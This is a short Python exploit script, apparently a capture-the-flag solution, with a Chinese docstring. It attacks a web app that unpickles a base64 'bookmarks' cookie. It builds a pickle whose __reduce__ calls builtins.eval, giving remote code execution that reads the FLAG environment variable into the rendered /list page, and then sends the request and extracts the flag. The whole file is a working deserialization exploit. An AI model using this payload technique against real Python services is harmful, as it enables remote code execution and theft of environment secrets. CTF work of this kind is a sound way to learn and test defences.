#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
X-057-24 exploit: 通过 Cookie 反序列化（pickle）RCE，把 FLAG 写入页面数据并打印。

思路：
- /list 会把 Cookie 中的 bookmarks 做 base64->pickle.loads()，再把得到的对象列表渲染到模板。
- 我们构造一个列表，其中元素反序列化时用 builtins.eval 执行：
    app.models.UrlObj(name=os.environ['FLAG'], url='http://example.com')
- 这样模板中 {{ item.name }} 会直接显示 FLAG。

运行：
  python3 exp.py  （无需参数，直接输出 FLAG）
"""
import sys
import re
import base64
import pickle


def build_payload_b64():
    import builtins
    code = "__import__('app.models', fromlist=['UrlObj']).UrlObj(name=__import__('os').environ.get('FLAG','NOFLAG'), url='http://example.com')"

    class RCE(object):
        def __reduce__(self):
            return (builtins.eval, (code,))

    data = pickle.dumps([RCE()], protocol=4)
    return base64.b64encode(data).decode('ascii')


def http_get_with_cookies(base, path, cookies):
    import requests
    url = base.rstrip('/') + path
    r = requests.get(url, headers={"User-Agent": "X-057-24-EXP"}, cookies=cookies, timeout=10)
    r.raise_for_status()
    return r.text


def extract_flag(html):
    m = re.search(r"FLAG\{[^}]+\}", html)
    return m.group(0) if m else None


def main():
    base = 'http://ip32820'
    b64 = build_payload_b64()
    cookies = {
        'user': 'testuser',
        'bookmarks': b64,
    }
    html = http_get_with_cookies(base, '/list', cookies)
    flag = extract_flag(html)
    if flag:
        print(flag)
        return 0
    return 1


if __name__ == '__main__':
    sys.exit(main())
